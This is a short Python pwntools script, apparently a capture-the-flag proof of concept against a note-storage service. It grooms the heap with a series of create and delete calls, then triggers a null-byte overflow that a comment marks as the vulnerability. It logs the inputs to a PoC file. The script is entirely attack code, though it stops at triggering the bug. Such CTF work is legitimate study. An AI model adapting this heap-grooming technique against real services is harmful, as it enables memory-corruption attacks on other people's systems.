#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#context.log_level = "debug"
#edit by wangyan aka ysyy

#strcut note{
#    QWORD size;
#    char name[32];
#    void *secret;
#    }

'''
host = "104.199.25.43"
port = 1337
'''
host = "127.0.0.1"
port = 2323
fp = open("PoC" ,'wb')


r = remote(host,port)

def p_sendline(data):
    #print data+'\n'
    fp.write(data+"\n")
    fp.flush()
    r.sendline(data)

def p_send(data):
    #print data
    fp.write(data)
    fp.flush()
    r.send(data)

def create(size,name,sec):
    p_send("0001")
    p_send(str(size).rjust(4, '0'))
    p_send(name.ljust(0x20,'0'))
    p_send(sec.ljust(size, '0'))


def delete(idx):
    p_send("0003")
    p_send(str(idx).rjust(4, '0'))



create(0x100, 'a', 'a')#0
create(0x100, 'a', 'a')#1
create(0x20 , 'a', 'a')#2
create(0x100, 'a', 'a')#3
create(0x90 , 'a', 'a')#4
create(0x100, 'a', 'a')#5
create(0x80 , 'a', 'a')#6
create(0x100, 'a', 'a')#7
create(0x40 , 'a', 'a')#8
create(0x100, 'a', 'a')#9
create(0x100, 'a', 'a')#10
create(0x40 , 'a', 'a')#11
create(0x100, 'a', 'a')#12

delete(11)
delete(9)
delete(3)
delete(5)
delete(7)
delete(1)
delete(8)
create(0x100, 'a', 'a')#13 --> 3
create(0x100, 'a', 'a')#14 --> 1
#vul:null byte offset
delete(2)
create(0x28, 'a', 'x'*0x28) #2


r.interactive()
